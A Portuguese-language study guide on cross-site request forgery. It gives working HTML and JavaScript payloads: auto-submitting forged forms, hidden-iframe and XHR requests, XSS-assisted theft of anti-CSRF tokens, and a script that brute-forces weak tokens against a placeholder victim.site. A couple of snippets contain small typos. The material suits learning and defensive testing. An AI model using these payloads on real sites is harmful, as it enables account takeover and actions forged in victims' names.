# CSRF: Recap & More

O ataque de CSRF permite explorar a relação de confiança entre a aplicação web e as requisições HTTP feitas pelo usuário. 

Uma aplicação está vulnerável a CSRF se:
- Para validar a sessão a aplicação depende de mecanismos como Cookies e Basic Auth, que são injetados automaticamente pelo navegador
- O atacante consegue determinar todos os parâmetros necessários para realizar uma requisição maliciosa

Para explorar o CSRF com sucesso o atacante precisa:
- Que a vitima tenha uma sessão ativa e válida quando executar a requisição maliciosa
- Conseguir forjar uma requisição em nome da vítima

Os 2 principais cenários onde a vulnerabilidade ocorre são:
- Ausência de defesa contra CSRF
- Fraqueza na implementação dos mecanismos de defesa como: cookie-only, tela de confirmação, usar POST, checar o referer header

# Attack Vectors
## Force Browsing with GET

Como já se sabe, a vulnerabilidade acontece quando o atacante consegue forçar o browser da vítima a fazer uma requisição na aplicação alvo

**Exemplo**

Imaginando um cenário onde o usuário consegue alterar o seu email simplesmente informando o endereço novo

```html
// Por padrão o form usa o método GET
...
<form action="change.php">
	<label name="email">Your email is: <b>myC00Lemail@victim.site</b></label>
	<input type="hidden" name="old" value="myC00Lemail@victim.site">
	<label name="email">New email</label>
	<input type="email" name="new" placeholder="your new email" required>
	<input type="submit" value="Confirm">
</form>
...
```

Nesse caso, não existe nenhuma proteção contra CSRF, então, para explorar a vulnerabilidade é preciso gerar uma requisição GET no navegador da vítima. Para isso pode-se usar a tag img

```html
<img src='http://victim.site/csrf/changeemail/change.php?old=mycoolemail%40victim.site&new=evil%40hacker.site'>
```

Para enviar o payload para a vítima pode-se usar uma outra vulnerabilidade, como XSS ou injeção de HTML, ou ainda, usar engenharia social

Além da tag img, existem várias outras que forçam o browser a fazer uma requisição GET

```html
// Requer interação do usuário
<a href=URL>click here
<form><input formaction=URL>
<button formaction=URL>
...

// Não requer a interação do usuário
<iframe src=URL>
<script src=URL>
<input type="image" src=URL alt="">
<embed src=URL>
<audio src=URL>
<video src=URL>
<source src=URL>
<video poster=URL>
<link rel="stylesheet" href=URL>
<object data=URL>
<body background=URL>
<div style="background:url(URL)">
<style>body { background:url(URL) }</style>
...
```

## Post Requests

Para explorar a vulnerabilidade através de uma requisição POST usando somente o HTML existe somente uma opção: o atributo "method" da tag FORM

```html
<form action="somewhere" method="POST">
```

Entretanto, existem várias possibilidades utilizando HTML + JavaScript.

Seguindo o mesmo cenário anterior, temos algumas opções:

```html
// submit()
...
<form action="change.php" method="POST" id="CSRForm">
	<input name="old" value="myC00Lemail@victim.site">
	<input name="new" value="evil@hacker.site">
</form>
<script>document.getElementById("CSRForm").submit()</script>
...

// onload e onerror
...
<form action="change.php" method="POST" id="CSRForm">
	<input name="old" value="myC00Lemail@victim.site">
	<input name="new" value="evil@hacker.site">
	<img src=x onerror="CSRForm.submit();">
</form>
...

// autofocus
...
<form action="change.php" method="POST" id="CSRForm">
	<input name="old" value="myC00Lemail@victim.site">
	<input name="new" value="evil@hacker.site" autofocus onfocus="CSRForm.submit()">
</form>
...
```

Normalmente ao realizar uma requisição POST o usuário é direcionado para outra página ou as vezes precisa confirmar o redirecionamento, para fazer isso de forma "silenciosa" temos algumas opções:

```html
...
<iframe style="display:none" name="CSRFrame"></iframe>
<form action="change.php" method="POST" id="CSRForm" target="CSRFrame">
	<input name="old" value="myC00Lemail@victim.site">
	<input name="new" value="evil@hacker.site">
</form>
<script>document.getElementById("CSRForm").submit()</script>
...

// Usando XMLHttpRequest (XHR)
...
var url = "URL";
var params = "old=myC00Lemail@victim.site&new=evil@hacker.site";
var CSRF = new XMLHttpRequest();
CSRF.open("POST", url, false);
CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
CSRF.send(params);
...

// jQuery
...
$.ajax({
	type: "POST",
	url: "URL",
	data: "old=myC00Lemail@victim.site&new=evil@hacker.site",
});
...
```

# Exploiting Weak Anti-CSRF Measures

Existem uma série de medidas conhecidas contra o CSRF que não protegem a aplicação adequadamente

**Usar somente requisições POST**

Como visto anteriormente, existem várias formas de explorar a vulnerabilidade usando o método POST

**Vários passos durante o processo**

Algumas aplicações implementam alguns passos passos para finalizar aquela tarefa, como tela de confirmação entre outras coisas. Uma vez que o atacante consegue entender para onde a requisição final vai, ele consegue burlar todos esses passos

**Checar o header Referer**

Esse header pode ser alterado facilmente com o uso de um proxy, por exemplo, tornando necessário a implementação de outros mecanismos para que ele tenha um efetivo bloqueio

**Token Anti-CSRF previsível**

Um dos mecanismos mais efetivos contra o CSRF é a utilização do token comumente chamado de Anti-CSRF token. Esse token é gerado e inserido junto com a requisição e verificado no backend

https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

Para que esse mecanismo seja implementado da maneira correta, o token deve ser gerado de forma randômica e não pode ser facilmente adivinhado pelo atacante

Obviamente, se a aplicação utilizar um token que seja fácil de adivinhar, a aplicação vai estar vulnerável, exemplo:

```html
<input type="hidden" name="antiCSRF" value="9">
<input type="hidden" name="antiCSRF" value="c9f0f895fb98ab9159f51fd0297e236d">  //Base64(8)
<input type="hidden" name="antiCSRF" value="MjE=">  //Base64(21)
```

**Unverified Anti-CSRF Token**

Algumas vezes a aplicação implementa um token forte, porém acaba não verificando o token no servidor. Esse é bem menos provável mas acontece

```html
<form action="change.php">
	<input type="hidden" name="anti_csrf_" value="bgoDZVGis4bdh6723882930rttIvgV">
	<input type="hidden" name="old" value="myC00Lemail@victim.site">
	<input type="email" name="new" placeholder="your new email" required>
	<input type="submit" value="Confirm">
</form>
```

**Secret Cookies**

Uma das técnicas usadas é criar um cookie com uma informação secreta e checar se o usuário enviou esse cookie na requisição. Porém os cookies são enviados em todas as requisições do usuário e também podem ser alteradas pelo usuário

# Advanced CSRF Exploitation

## Bypassing CSRF Desenses with XSS

Todos os mecanismos implementados para proteção do CSRF são feitos para mitigar ataques de CSRF e não XSS. Tecnicamente, um ataque de XSS está na mesma origem que o CSR, então, todas os mecanismos de defesa, tirando o Challenge-Response, podem ser bypassados 

### Bypassing Header Checks

Checar os headers Referer e Origin simplesmente verificam se a requisição veio da mesma origem. Explorando o XSS esses mecanismos já são bypassados

### Bypassing Anti-CSRF Token

Quando a aplicação uma um padrão de token sincronizado com o servidor o cenário muda um pouco. Para burlar essa proteção é preciso realizar o hijack do token Anti-CSRF

Com o XSS existem 2 cenários possíveis: O XSS está na mesma página que o formulário ou o XSS está em outra parte da aplicação

O Bypass acontece geralmente em 2 ou 3 passos, dependendo de onde o XSS está

1. Fazer uma requisição válida do formulário
2. Extrair o token válido do código fonte
3. Forjar uma requisição com o token roubado

**1. Fazer uma requisição válida do formulário**

Nesse passo precisamos pegar o HTML da página

No pior cenário o XSS não está na mesma página do formulário alvo então é necessário realizar um GET

Usando o XMLHttpRequest
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(){
	if (xhr.readyState == 4){
		var htmlSource = xhr.responseText;  // <- Código fonte da página
		//some operations...
	}
}
xhr.open('GET','http://victim.site/csrf-form-page.html', true);
xhmr.send();
```

jQuery
```javascript
jReq = jQuery.get('http://victim.site/csrf-form-page.html',
	function(){
		var htmlSource = jReq.responseText;  // <- Código fonte da página
		//some operations...
	});
```

**2. Extrair o token válido do código fonte**

No melhor cenário, é possível acessar o DOM diretamente e extrair o token

```javascript
var token = document.getElementsByName('csrf_token')[0].value
```

Se o XSS está em uma página diferente é necessário analisar o resultado da primeira requisição para extrair o token do HTML

https://developer.mozilla.org/en-US/docs/Web/API/DOMParser

Pode-se realizar essa função de 2 modos:
```javascript
//Using Regex
pattern = /csrf_token'\svalue='(.*)'/;
token = htmlSource.match(pattern)[1]

//Using DOMParser
parser = new DOMParser().parseFromString(htmlSource, "text/html");
token = parser.getElementsByName('csrf_token')[0];
```

**3. Forjar uma requisição com o token roubado**

Após conseguir todas as informações, basta realizar a requisição usando uma das técnicas vistas anteriormente

## Bypassing Anti-CSRF Token Brute Forcing

Para esse cenário, temos uma situação onde não conseguimos roubar os cookies do usuário mas ele vai acessar uma página maliciosa de nosso controle, ou existe um XSS na aplicação onde é possível injetar o código

Como exemplo, será utilizado o mesmo exemplo anterior de alteração de email, porém agora com um token randomico

```html
<form action="change.php" method="POST">
	<input type="hidden" name="csrfToken" value="TOKEN"> // randon token
	<input type="hidden" name="old" value="myC00Lemail@victim.site">
	<input type="email" name="new" placeholder="your new email" required>
	<input type="submit" value="Confirm">
</form>
```

Para o exemplo, vamos considerar que o token é um número randômico entre 100 e 300

```html
...
<form action="change.php" method="POST">
	<input type="hidden" name="csrfToken" value="TOKEN"> // rand(100, 300);
...
```

Para explorar essa vulnerabilidade é necessário criar um script que realiza 200 requisições para esse formulário. Para isso pode-se usar o XMLHttpRequest

```javascript
var i = 100;
function bruteLoop(){
	setTimeout(function(){
		XHRPost(i);
		i++;
		if (i < 300)
			bruteLoop();
	}, 30) // sleep a little bit
}

function XHRPost(tokenID){
	var http = new XMLHttpRequest();
	var url = "http://victim.site/csrf/brute/change_post.php"; // Change this
	http.open("POST", url, true);

	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	http.withCredentials = 'true';

	http.onreadystatechange = function(){ // We don't care about responses
		if (http.readyState > 1) http.abort();
	}
	var params = "old=myoldemail&confirm=1&new=attackerEmail&csrftoken=" + tokenID;
	http.send(params);
}
```

Caso o formulário seja enviado através do método GET/

```javascript
function MakeGET(tokenID){

	var url = "http://victim.site/csrf/brute/change_post.php?";
	url += "old=myoldemail&confirm=1&";
	url += "new=attackerEmail&csrftoken=" + tokenID;"

	new Image().src = url; // GET request
}
```

